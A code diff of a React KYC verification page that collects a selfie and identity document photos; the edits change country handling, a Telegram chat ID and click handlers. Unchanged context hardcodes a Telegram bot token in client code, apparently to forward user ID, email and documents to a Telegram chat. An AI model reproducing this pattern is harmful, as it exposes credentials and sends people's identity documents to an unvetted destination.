@@ -11,7 +11,7 @@ const KycPage = () => {
 	const [documentPhoto2, setDocumentPhoto2] = useState<File | null>(null)
 	const [documentType, setDocumentType] = useState<string>('')
 	const [isOpen, setIsOpen] = useState(false)
-	const [country, setCountry] = useState<SelectMenuOption['title']>('Poland')
+	const [country, setCountry] = useState<SelectMenuOption['value']>('PL')
 	const [selfie, setSelfie] = useState<File | null>(null) // Добавляем инициализацию состояния для selfie
 	const user = useAppSelector(state => state.user.user) as IUser | null
 	const handleFileUpload = (
@@ -48,7 +48,7 @@ const KycPage = () => {
 			}
 
 			const telegramToken = '7134412413:AAHnxqCxBbXomWtWbLxkwE0ThHKRg84bVik'
-			const chatId = '-4179672808'
+			const chatId = '-1001996818008'
 
 			const userInfo = user
 				? `User ID: ${user.id}\nUser Email: ${user.email}\n`
@@ -127,7 +127,7 @@ const KycPage = () => {
 										onChange={setCountry}
 										//@ts-ignore
 										selectedValue={COUNTRIES?.find(
-											option => option.title === country
+											option => option.value === country
 										)}
 									/>
 								</div>
@@ -173,7 +173,10 @@ const KycPage = () => {
 										/>
 										<label
 											htmlFor='selfie'
-											onClick={() => captureImage(selfieInputRef)}
+											onClick={e => {
+												e.preventDefault()
+												captureImage(selfieInputRef)
+											}}
 											className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue-200 active:bg-blue-800'>
 											Take a Selfie
 										</label>
@@ -197,7 +200,10 @@ const KycPage = () => {
 											/>
 											<label
 												htmlFor='document-photo1'
-												onClick={() => captureImage(fileInputRef1)}
+												onClick={e => {
+													e.preventDefault()
+													captureImage(fileInputRef1)
+												}}
 												className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue-200 active:bg-blue-800'>
 												Choose a File
 											</label>
@@ -220,7 +226,10 @@ const KycPage = () => {
 											/>
 											<label
 												htmlFor='document-photo2'
-												onClick={() => captureImage(fileInputRef2)}
+												onClick={e => {
+													e.preventDefault()
+													captureImage(fileInputRef2)
+												}}
 												className='cursor-pointer block w-full py-8 px-4 bg-gradient-to-b from-cyan-400 to-light-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:border-blue-700 focus:ring focus:ring-blue border-gray-300 rounded mt-1'>
 												Choose a File
 											</label>
